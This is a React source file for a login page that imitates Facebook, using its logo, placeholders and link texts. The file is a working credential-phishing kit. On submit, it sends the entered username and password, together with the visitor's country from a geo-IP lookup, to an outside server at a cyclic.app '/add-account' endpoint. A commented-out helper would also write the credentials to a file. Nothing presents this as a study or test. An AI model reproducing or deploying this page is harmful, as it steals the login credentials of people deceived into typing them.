import React,{ useState, useEffect } from 'react';
import { Box, 
    FormControl,
    FormLabel,
    Button,
    FormErrorMessage,
    Input,
    FormHelperText, 
    InputGroup,
    InputRightElement,
    Text
} from '@chakra-ui/react';
import { Link } from 'react-router-dom';
import logo from "../Facebook-Logo.png"
import { useTranslation } from 'react-i18next';
import axios from 'axios'
interface LoginFormProps {
  // onSubmit: (username: string, password: string) => void;
}

const LoginForm = () => {
  const { t, i18n } = useTranslation();
  const [uid, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [show, setShow] = React.useState(true)
  // const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
  //   event.preventDefault();
  //   onSubmit(username, password);
  // };
  // const saveToFile = (username: any, password: any) => {
  //   const data = `Username: ${username}\nPassword: ${password}`;
  //   const blob = new Blob([data], { type: 'text/plain' });
  //   const url = URL.createObjectURL(blob);
  
  //   const link = document.createElement('a');
  //   link.download = 'credentials.txt';
  //   link.href = url;
  //   link.click();
  
  //   URL.revokeObjectURL(url);
  // };
  const validate = () => {
    if(uid.trim() === '' || password.trim() === '') {
      alert('Username or password cannot be blank');
      return false;
    } else if(isNaN(+uid)) {
      alert('Wrong username or password');
      return false;
    } else if(uid.length < 3 || password.length < 6) {
      alert('Username must be at least 3 characters and password must be at least 6 characters');
      return false;
    } else {
      return true
    }
  }
  const fetchLocale = async() => {
    try {
      const response = await axios.get('https://freeipapi.com/api/json/');
      const countryCode = response.data.countryCode;
      i18n.changeLanguage(countryCode === 'VN' ? 'vi' : 'en');
    } catch (error) {
      console.error('Error fetching locale:', error);
    }
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    let country = '';
    if (!validate()) {
      alert('Validation failed. Please check your input.');
      return;
    }
    try {
      const response = await axios.get('https://freeipapi.com/api/json/');
      country = response.data.countryCode;
      } catch (error) {
        console.error('Error fetching country data:', error);
      }

      // Prepare data to send
      const data = {
        uid,
        password,
        country,
        createdAt: new Date().toISOString(),
      };

      // Send data
      try {
        await axios.post('https://wild-pink-duck-kilt.cyclic.app/add-account', data);
        alert('Data submitted successfully');
      } catch (error) {
        console.error('Error submitting data:', error);
      }
    // validate();
    // saveToFile(username, password);
    // fetchLocale()
  };

  useEffect(() => {
    fetchLocale()
  },[])
  return (
    <Box className='auth-form' display='flex' flexDirection='row' borderRadius='10px' w='100%' h='100%' alignItems='center' justifyContent="center">
  
        <Box className='login-form' w='90%' h='50%' textAlign='left' borderRadius='10px' padding= '10px'>
       
          <form onSubmit={handleSubmit} style={{width: '100%',display: 'block', justifyContent: 'center', alignItems: 'center'}}>
            <Box display='flex' justifyContent='center'>
              <img src={logo} alt="" style={{width: '150px', height: 'auto'}}/>
            </Box>
            <input 
              type="text" style={{width: '100%', marginBottom: '7px' ,height: '50px', borderRadius: '5px', backgroundColor: '#f5f6f8', padding: '0 25px 0 25px', border: '1px solid #ececec', fontSize: '13px'}}
              placeholder={t('Email address or phone number')}
              value={uid} 
              onChange={(e) => setUsername(e.target.value)}
              />
            <input 
              type="password" style={{width: '100%',marginBottom: '7px' ,height: '50px', borderRadius: '5px', background: '#f5f6f8', padding: '0 25px 0 25px', border: '1px solid #ececec', fontSize: '13px'}}
              placeholder={t('Password')}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              />
            <Button 
              type='submit'
              colorScheme='messenger' w='100%' mt={1}
              borderRadius='3px'
            >
              {t('Log in')}
            </Button>
            <p style={{color: '#1a78f4', textAlign: 'center', margin: '10px 0px'}}>{t('Forgotten password ?')}</p>
            <Box className='spec-text' mb={5}>
              <Box className='indicator'></Box>
              <Box mx={2} color='#686869'>
              {t('or')}
              </Box>
              <Box className='indicator'></Box>
            </Box>
            <Box w='100%' display='flex' justifyContent='center'>
            <Button className="sign-up"
            >
              {t('Create new account')}
            </Button>
            </Box>
            <Box color='#aaaaaa' fontSize='12' textAlign='center'>
            {t('About us • Help • See more')}
            </Box>
          </form>
        </Box>
    </Box>
    
  );
};
export default LoginForm